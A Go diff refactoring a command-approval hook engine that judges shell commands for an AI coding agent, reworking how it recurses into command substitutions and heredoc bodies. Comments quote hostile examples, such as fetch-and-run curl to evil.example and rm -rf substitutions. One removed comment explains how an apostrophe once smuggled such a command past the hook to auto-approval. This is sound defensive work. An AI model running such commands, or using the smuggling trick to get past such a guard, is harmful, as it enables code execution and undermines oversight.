@@ -286,8 +286,8 @@ func (e *Engine) EvaluateHook(input *hookio.HookInput) hookio.RuleResult {
 // attribution over the engine's generic "nothing to judge" identity (pg2-he22o).
 //
 // Every accumulator this file folds into — EvaluateExpression's
-// mostRestrictive, foldSubstitutionScan's result, evaluateHeredocBodies'
-// result — is SEEDED at {Approve, Module: "engine"}: the least-restrictive
+// mostRestrictive and foldSubstitutionScan's result — is SEEDED at
+// {Approve, Module: "engine"}: the least-restrictive
 // identity for a "the whole is Approve iff every part independently approves"
 // fold, so that zero parts contributes nothing. hookio.MostRestrictive's tie-
 // break keeps `current`, and with the seed always occupying that slot across
@@ -300,9 +300,10 @@ func (e *Engine) EvaluateHook(input *hookio.HookInput) hookio.RuleResult {
 //
 // candidate.Module == "engine" is true of every neutral "nothing to judge"
 // contribution this engine emits on the Approve path (evaluateRedirections'
-// no-op branches, evaluateAssignmentOnlyLeaf's neutral branch, and the sibling
-// seeds in foldSubstitutionScan / evaluateHeredocBodies) — no registered rule
-// module is named "engine" (audited: internal/rules/*/*.go). A candidate that
+// no-op branches, evaluateAssignmentOnlyLeaf's neutral branch, and
+// foldSubstitutionScan's own seed, folded for both command-position and
+// heredoc-body substitutions) — no registered rule module is named "engine"
+// (audited: internal/rules/*/*.go). A candidate that
 // is Approve and NOT "engine" can therefore only be a rule's own decisive
 // verdict: e.Evaluate returns Approve only from a rule (its manufactured
 // exhaustion is always NoOpinion, never Approve — see Evaluate's loop-
@@ -319,15 +320,8 @@ func mostRestrictiveAttributed(acc, candidate hookio.RuleResult) hookio.RuleResu
 
 func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
 	normalized := normalizeExpression(expr)
-	// Check for cycle: has this exact expression been evaluated before?
-	for _, frame := range stack {
-		if frame.Expression == normalized {
-			return hookio.RuleResult{
-				Decision: hookio.NoOpinion,
-				Reason:   "recursive evaluation: cycle detected (command repeated in stack)",
-				Module:   "engine",
-			}
-		}
+	if cyc, hit := detectCycle(normalized, stack); hit {
+		return cyc
 	}
 
 	// ONE PARSE, through the seam (ADR 0039 step 2, pg2-fez3d). The comment
@@ -337,7 +331,54 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 	// to be taught where heredoc bodies were, and whose whole reason for existing
 	// was that a '#' inside a body is data (pg2-r2rf3) — has nothing left to do.
 	// The parser is handed the ORIGINAL expr.
-	sp := cmdparse.ParseShell(expr)
+	//
+	// This is EvaluateExpression's own TEXT entry point (I7's permanent one —
+	// the hook receives a command string and nothing upstream has parsed it,
+	// and rule packages like envvars/docker/nix/kubectl reach it with genuinely
+	// constructed or extracted text that has no corresponding subtree in any
+	// prior parse). evaluateParsed below is the shared core: this function's
+	// only extra job, versus evaluateParsed, is producing `sp` by parsing.
+	return e.evaluateParsed(expr, cmdparse.ParseShell(expr), normalized, stack, origin)
+}
+
+// detectCycle is EvaluateExpression's cycle check, factored out so
+// foldSubstitutionScan's substitution/heredoc-body recursion (ADR 0039 step 4,
+// pg2-1019a) can run it directly against a body's own normalized text without
+// going through EvaluateExpression's TEXT entry point above — which would
+// re-parse a body this function's caller already has pre-lowered leaves for
+// (I7: MUST NOT re-parse body text).
+func detectCycle(normalized string, stack []hookio.StackFrame) (hookio.RuleResult, bool) {
+	for _, frame := range stack {
+		if frame.Expression == normalized {
+			return hookio.RuleResult{
+				Decision: hookio.NoOpinion,
+				Reason:   "recursive evaluation: cycle detected (command repeated in stack)",
+				Module:   "engine",
+			}, true
+		}
+	}
+	return hookio.RuleResult{}, false
+}
+
+// evaluateParsed is EvaluateExpression's shared core, over an ALREADY-LOWERED
+// cmdparse.ShellParse (ADR 0039 I7: never parsed here, only consumed). It is
+// called both by EvaluateExpression's text entry point above (which just
+// parsed expr to produce sp) and by foldSubstitutionScan below, which already
+// holds a substitution's or heredoc body's pre-lowered leaves and must not
+// re-parse them (that re-parse was the two "thin shim" TEXT hops this bead
+// removes — see foldSubstitutionScan's own doc).
+//
+// expr is the EXACT source text sp was lowered from — EvaluateExpression's own
+// parameter, or foldSubstitutionScan's sub.Body — needed here (as opposed to
+// merely for the cycle key) for heredocFloor's own text-classification
+// narrowing and for the synthetic HookInput's RootExpression.
+//
+// normalized is the caller's already-computed cycle-detection key for THIS
+// sp's own source text — EvaluateExpression's `normalized`, or
+// foldSubstitutionScan's per-substitution `subNormalized` — since both callers
+// need it themselves (for stack frames / cycle checks) and computing it twice
+// would be redundant.
+func (e *Engine) evaluateParsed(expr string, sp cmdparse.ShellParse, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
 	parsed := sp.Leaves
 
 	// I1b — the fail-safe PARSE floor. A whole-command parse failure MUST yield a
@@ -416,7 +457,8 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 			}
 			if pc.HasHeredoc {
 				leafResult = hookio.MostRestrictive(leafResult, heredocFloor(expr, stack))
-				leafResult = hookio.MostRestrictive(leafResult, e.evaluateHeredocBodies(pc, normalized, stack, origin))
+				leafResult = hookio.MostRestrictive(leafResult,
+					e.foldSubstitutionScan(pc.UnquotedHeredocSubstitutions(), normalized, stack, origin))
 				judgedLeaf = true
 			}
 			if assignResult, judged := e.evaluateAssignmentOnlyLeaf(pc, currentCWD, expr, parsed, inCommandVars, inCommandTempDirVars, origin); judged {
@@ -433,19 +475,22 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 			// smuggle `$(curl|sh)` past every rule once the word list became a leaf of
 			// its own (pg2-qkecz hole B).
 			//
-			// StripLeadingEnvAssignments matches the main path exactly, which keeps
-			// env-assignment VALUES out of this scan — those are the static
-			// classifyExpansion path (pg2-gkd5e), and recursing them here would
-			// double-judge them under a different model. The fold is seeded with the
-			// neutral Approve, so a leaf whose Raw holds no substitution contributes
-			// nothing and cannot demote an otherwise-approved expression.
+			// pc.Substitutions already excludes env-assignment VALUES, matching what
+			// cmdparse.StripLeadingEnvAssignments used to strip before this scan —
+			// those are the static classifyExpansion path (pg2-gkd5e), and recursing
+			// them here too would double-judge them under a different model. It was
+			// computed during ParseShell's own walk of pc's already-parsed subtree
+			// (ADR 0039 step 4, I7/I12), so there is no re-parse of pc.Raw here at
+			// all. The fold is seeded with the neutral Approve, so a leaf with no
+			// substitutions contributes nothing and cannot demote an otherwise-approved
+			// expression.
 			//
 			// mostRestrictiveAttributed (not a plain fold): a substitution body here
-			// recurses through EvaluateExpression, so its Approve can already carry a
+			// recurses through evaluateParsed, so its Approve can already carry a
 			// rule's own attribution rather than the neutral "no substitutions" seed —
 			// same pg2-he22o concern as the assignment fold above.
 			leafResult = mostRestrictiveAttributed(leafResult,
-				e.evaluateSubstitutionsIn(cmdparse.StripLeadingEnvAssignments(pc.Raw), normalized, stack, origin))
+				e.foldSubstitutionScan(pc.Substitutions, normalized, stack, origin))
 			// mostRestrictiveAttributed here too: this is the fold that used to be a
 			// raw `leafResult.Decision > mostRestrictive.Decision` strict compare, which
 			// never revisits an exact tie — silently keeping mostRestrictive's engine
@@ -501,20 +546,23 @@ func (e *Engine) EvaluateExpression(expr string, stack []hookio.StackFrame, orig
 		// <(...) / >(...) body in the COMMAND (env-assignment values excluded — those
 		// are the static classifyExpansion path / pg2-gkd5e) is re-evaluated through
 		// ALL rules with a pushed StackFrame (so the cycle check above fires) and
-		// folded most-risky-wins. The raw command text is scanned (not post-unquote
-		// args) so a single-quoted literal `'$(rm -rf ~)'` is correctly skipped and a
-		// double-quoted `"$(cmd)"` is still recursed. This replaces the former
-		// static command-substitution guard AND the process-substitution loop with
-		// one shared enumerator.
+		// folded most-risky-wins. pc.Substitutions was found by walking pc's own
+		// already-parsed subtree during ParseShell's one walk of expr (ADR 0039 step
+		// 4, I7/I12) — not by re-scanning pc.Raw — so a single-quoted literal
+		// `'$(rm -rf ~)'` is still correctly absent (the parser never produced a
+		// CmdSubst node for it) and a double-quoted `"$(cmd)"` is still present. This
+		// replaces the former static command-substitution guard AND the
+		// process-substitution loop with one shared enumerator.
 		cmdResult = hookio.MostRestrictive(cmdResult,
-			e.evaluateSubstitutionsIn(cmdparse.StripLeadingEnvAssignments(pc.Raw), normalized, stack, origin))
+			e.foldSubstitutionScan(pc.Substitutions, normalized, stack, origin))
 
 		// A heredoc BODY is opaque to the rule chain, so a heredoc-bearing leaf is
 		// FLOORED at NoOpinion — but the body's own substitutions are still recursed when
 		// the delimiter was unquoted, because those genuinely execute (pg2-r2rf3).
 		if pc.HasHeredoc {
 			cmdResult = hookio.MostRestrictive(cmdResult, heredocFloor(expr, stack))
-			cmdResult = hookio.MostRestrictive(cmdResult, e.evaluateHeredocBodies(pc, normalized, stack, origin))
+			cmdResult = hookio.MostRestrictive(cmdResult,
+				e.foldSubstitutionScan(pc.UnquotedHeredocSubstitutions(), normalized, stack, origin))
 		}
 
 		// Track most restrictive. mostRestrictiveAttributed, not a plain fold: this is
@@ -795,98 +843,48 @@ func recursedSubstitutionHeredocCleared(expr string, stack []hookio.StackFrame) 
 	return cmdparse.ClassifySubstitutionBody(expr) == cmdparse.SubstitutionCleared
 }
 
-// evaluateHeredocBodies recurses the command substitutions inside each of pc's
-// UNQUOTED heredoc bodies (pg2-r2rf3).
+// evaluateHeredocBodies and evaluateSubstitutionsIn — the two ENGINE TEXT HOPS
+// ADR 0039's LOWERING.md named as this bead's (pg2-1019a) remaining shims — are
+// DELETED. Each took a body/leaf STRING and handed it to a cmdparse scan
+// (ScanSubstitutionsInHeredocBody / ScanSubstitutions) that re-parsed text this
+// same expression's own ParseShell call had already parsed. Their callers now
+// read pc.UnquotedHeredocSubstitutions() / pc.Substitutions directly — PLAIN
+// DATA pre-lowered during that one parse (ADR 0039 step 4, I7/I12) — and feed
+// them straight to foldSubstitutionScan below, which no longer takes a scan to
+// fold, only a []cmdparse.Substitution.
 //
-// `cat <<EOF` expands its body, so a `$(curl evil | sh)` in there really runs and must
-// be judged exactly like a substitution written on the command line. `cat <<'EOF'`
-// does not expand anything, so the identical bytes are literal data and are NOT
-// evaluated — evaluating them would manufacture false positives out of any prose that
-// happens to quote a shell command. cmdparse records the quoting per heredoc; this
-// only ever sees the unquoted bodies.
-func (e *Engine) evaluateHeredocBodies(pc cmdparse.ParsedCommand, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
-	result := hookio.RuleResult{Decision: hookio.Approve, Reason: "no expandable heredoc body", Module: "engine"}
-	for _, body := range pc.UnquotedHeredocBodies() {
-		// A heredoc body is scanned under the BODY expansion model, where a quote
-		// character is data: an apostrophe in prose must not open a phantom quoted
-		// region that hides the rest of the body's live substitutions (pg2-wguam).
-		//
-		// THIN SHIM — owned by pg2-1019a (ADR 0039 step 4). Step 2a moved the scan
-		// itself onto the seam, so the body is now modelled by the bash parser's own
-		// here-document entry point. What survives here is the TEXT hop: this passes a
-		// body STRING, which the seam must parse, where ADR 0039's I7 requires
-		// recursion to walk a SUBTREE of the already-parsed file instead. Converting
-		// this call to the structural entry point is step 4's unit of work.
-		//
-		// mostRestrictiveAttributed: `result` starts at the same Approve+"engine" seed
-		// pattern as EvaluateExpression's own fold, and foldSubstitutionScan's own
-		// result can carry a rule's decisive Approve recursed in from a nested
-		// EvaluateExpression call — same pg2-he22o attribution concern, one level down.
-		result = mostRestrictiveAttributed(result,
-			e.foldSubstitutionScan(cmdparse.ScanSubstitutionsInHeredocBody(body), normalized, stack, origin))
-	}
-	return result
-}
+// cmdparse.ScanSubstitutions and cmdparse.ScanSubstitutionsInHeredocBody
+// THEMSELVES are NOT deleted: unlike these two engine hops, they still have
+// live callers with no corresponding pre-parsed subtree to walk —
+// rules/ssh's carriesSubstitution scans a REMOTE host's command text, which
+// is data inside a local quoted argument and was never parsed as CETA's own
+// AST; cmdparse.HasUnsafeCommandSubstitution (no production caller, kept
+// correct for the fuzz harness per its own doc) uses ScanSubstitutions too.
+// Both are I7's permanent text entry point, not this bead's concern.
 
-// evaluateSubstitutionsIn folds the verdict of every top-level substitution body in
-// SHELL TEXT (a leaf's command text), most-restrictive-wins, seeded with the neutral
-// Approve so a text with no substitutions contributes nothing.
+// unparseableSubstitutionFloor — the verdict a DESYNCED substitution scan used
+// to contribute (pg2-wguam, P0 SECURITY: an empty/short body list from a scan
+// that lost track of the text is absence of evidence, not evidence of
+// absence) — is DELETED along with its only caller.
 //
-// THIN SHIM — owned by pg2-1019a (ADR 0039 step 4). As above, step 2a moved the scan
-// onto the seam but left the TEXT hop: `text` here is a leaf's Raw, which the seam
-// re-parses, where I7 requires walking the subtree of the file the engine already
-// parsed. That text is also POST-heredoc-strip, so for a heredoc-bearing leaf it ends
-// at an unclosed here-document and does not parse on its own — the seam's recovery
-// prefix is what keeps that from forfeiting a command-line substitution's verdict
-// (see cmdparse.substitutionPrefixAfterFailure). Step 4 removes the hop and with it
-// the need for that salvage.
-func (e *Engine) evaluateSubstitutionsIn(text, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
-	return e.foldSubstitutionScan(cmdparse.ScanSubstitutions(text), normalized, stack, origin)
-}
-
-// unparseableSubstitutionFloor is the verdict contributed by text whose substitution
-// scan DESYNCED (pg2-wguam, P0 SECURITY).
-//
-// The scan's empty/short body list is not evidence of safety, it is absence of
-// evidence: cmdparse stopped modelling the text, so whatever followed the desync was
-// never enumerated. EvaluateExpression folds Approve iff no leaf objects, so reading
-// that silence as "nothing to object to" MANUFACTURED an `allow` out of a parse
-// failure — the measured hole being one apostrophe of English prose inside an
-// unquoted heredoc body nested in `"$( … )"`:
-//
-//	bd update x --description "$(cat <<EOF
-//	the agent's note
-//	value $(curl -s http://evil.example/x | sh)
-//	EOF
-//	)"                                            ->  allow   (the curl really runs)
-//
-// HISTORICAL MECHANISM (the hand-rolled scan it describes was deleted by ADR 0039
-// step 2a, pg2-zeqa5): the apostrophe left `cmdparse.matchParen` unable to find the
-// `$( )`'s closing paren, so the outer substitution was never enumerated; because
-// stripHeredocBodies deliberately leaves a heredoc inside `$( )` glued to its
-// substitution (the substitution recursion is what strips it), losing that one extent
-// also skipped heredocFloor and evaluateHeredocBodies. Neither of those guards was at
-// fault — they were never reached. The carrier is incidental:
-// `echo "$(echo don't)" "$(rm -rf .git/objects)"` auto-approved with no heredoc at
-// all, the second substitution simply discarded.
-//
-// The scan is now the real bash parser behind the cmdparse seam, which models both
-// carriers correctly — but this floor is NOT thereby obsolete and MUST NOT be
-// removed. Its contract is about the class, not the carrier: whenever cmdparse
-// cannot model the text it was given, the empty body list is absence of evidence
-// rather than evidence of absence. A real parser has its own unparseable inputs
-// (I1b/I10), and this is where they land.
-//
-// NoOpinion — defer to Claude Code — is the correct verdict for text ceta cannot parse,
-// and it is folded through MostRestrictive rather than returned, so it can neither be
-// order-dependent nor mask a Reject an enumerated sibling substitution earned.
-func unparseableSubstitutionFloor(reason string) hookio.RuleResult {
-	return hookio.RuleResult{
-		Decision: hookio.NoOpinion,
-		Reason:   "unparseable command text (" + reason + "): substitutions cannot be enumerated (deferred to claude-code)",
-		Module:   "engine",
-	}
-}
+// Its call site was foldSubstitutionScan's `if scan.Unparseable` branch, fed
+// by evaluateSubstitutionsIn/evaluateHeredocBodies re-parsing a leaf's Raw or a
+// heredoc body as ISOLATED text — a genuinely separate parse of a substring
+// that could, in principle, desync from the parse that produced the substring
+// in the first place. ADR 0039 step 4 removes that re-parse entirely:
+// pc.Substitutions and Heredoc.Substitutions are found by WALKING nodes
+// already inside the one successful parse of the whole expression, so there
+// is no second parse left to desync — a leaf this engine reached already
+// belongs to a `!sp.Unparseable` ShellParse, and every substitution/heredoc
+// body nested under it inherits that same guarantee, recursively, all the way
+// down (cmdparse.lowerSubtree never calls Parser.Parse/Document). The class of
+// input this floor existed to catch — cmdparse stopped modelling text it was
+// asked to scan — is therefore structurally impossible on this path now,
+// exactly as ADR 0039's LOWERING.md predicted ("Step 4 removes the hop and
+// with it the need for that salvage"). The underlying I1a/I1b PRINCIPLE this
+// floor implemented is not weakened: it still governs
+// cmdparse.SubstitutionScan.Unparseable directly, for its own remaining
+// TEXT-based callers (rules/ssh's carriesSubstitution reads it inline).
 
 // commandSubstitutionFloor is the verdict contributed by a COMMAND substitution
 // ($()/backtick) body that fails EITHER gate of cmdparse's static
@@ -934,9 +932,9 @@ func unparseableSubstitutionFloor(reason string) hookio.RuleResult {
 // Delegated bodies never reach this floor — see the call site's own
 // "DELEGATED NEVER FLOORS HERE" comment for why such a body must stay governed
 // by recursion alone, in both directions. Folded through hookio.MostRestrictive
-// like unparseableSubstitutionFloor and heredocFloor above, so this stays
-// order-independent: it can only ever raise a verdict, never mask a Reject a
-// sibling substitution or the leaf's own rules already earned.
+// like heredocFloor above, so this stays order-independent: it can only ever
+// raise a verdict, never mask a Reject a sibling substitution or the leaf's
+// own rules already earned.
 func commandSubstitutionFloor(body string) hookio.RuleResult {
 	return hookio.RuleResult{
 		Decision: hookio.Ask,
@@ -945,20 +943,47 @@ func commandSubstitutionFloor(body string) hookio.RuleResult {
 	}
 }
 
-// foldSubstitutionScan folds one substitution scan into a single verdict: the
-// unparseable floor when the scan desynced, plus every enumerated body recursed
-// through ALL rules and held to the static-allowlist floor. Shared by command text
-// and expandable heredoc bodies so the identical recursion applies to both, with only
-// the expansion model (cmdparse.ScanSubstitutions vs
-// cmdparse.ScanSubstitutionsInHeredocBody) differing.
-func (e *Engine) foldSubstitutionScan(scan cmdparse.SubstitutionScan, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
+// foldSubstitutionScan folds a leaf's OR a heredoc body's OWN top-level
+// substitutions into a single verdict: every one recursed through ALL rules
+// and held to the static-allowlist floor. Shared by command-position
+// substitutions (ParsedCommand.Substitutions) and expandable heredoc bodies
+// (ParsedCommand.UnquotedHeredocSubstitutions) so the identical recursion
+// applies to both — they differ only in WHICH pre-lowered slice the caller
+// passes, not in how each entry is folded.
+//
+// subs is ALREADY KNOWN, pre-lowered data (ADR 0039 step 4, I7/I12): it was
+// found by walking nodes inside the one successful parse that produced the
+// caller's leaf, so — unlike the deleted evaluateSubstitutionsIn /
+// evaluateHeredocBodies text hops this function used to be fed by — there is
+// no "the scan desynced" case left to floor here. See the deleted
+// unparseableSubstitutionFloor's own comment (just above commandSubstitutionFloor)
+// for why that is structurally true rather than merely unobserved.
+func (e *Engine) foldSubstitutionScan(subs []cmdparse.Substitution, normalized string, stack []hookio.StackFrame, origin *hookio.HookInput) hookio.RuleResult {
 	result := hookio.RuleResult{Decision: hookio.Approve, Reason: "no substitutions to evaluate", Module: "engine"}
-	if scan.Unparseable {
-		result = hookio.MostRestrictive(result, unparseableSubstitutionFloor(scan.Reason))
-	}
-	for _, sub := range scan.Substitutions {
-		subStack := append(stack, hookio.StackFrame{RuleName: "engine", Command: "substitution", Expression: normalized})
-		subResult := e.EvaluateExpression(sub.Body, subStack, origin)
+	for _, sub := range subs {
+		// subNormalized, not the outer `normalized`: the cycle-detection KEY MUST
+		// be this substitution's OWN body text (I12 — an exact source slice,
+		// normalised), so a body that repeats an ANCESTOR's command is caught
+		// however deep the nesting. The pushed stack frame still carries the
+		// OUTER `normalized` (unchanged from before this bead): that is what
+		// lets a substitution nested inside sub.Body, several levels down, be
+		// recognised as repeating THIS level's own enclosing command — see
+		// recursedSubstitutionHeredocCleared's doc for the mechanism that reads
+		// the frame back.
+		subNormalized := normalizeExpression(sub.Body)
+		var subResult hookio.RuleResult
+		if cyc, hit := detectCycle(subNormalized, stack); hit {
+			subResult = cyc
+		} else {
+			subStack := append(stack, hookio.StackFrame{RuleName: "engine", Command: "substitution", Expression: normalized})
+			// evaluateParsed, not EvaluateExpression: sub.Leaves is ALREADY the
+			// pre-lowered leaf set for sub.Body (recursively, all the way down —
+			// cmdparse.lowerSubtree populated its own Substitutions/Heredocs the
+			// same way), so calling the text entry point here would re-parse a
+			// body this expression's own ParseShell call already parsed — the
+			// exact re-parse ADR 0039 step 4 removes.
+			subResult = e.evaluateParsed(sub.Body, cmdparse.ShellParse{Leaves: sub.Leaves}, subNormalized, subStack, origin)
+		}
 
 		// Static allowlist FLOOR for command substitutions ($()/backtick): BOTH
 		// GATES must positively clear a body before its contribution can be
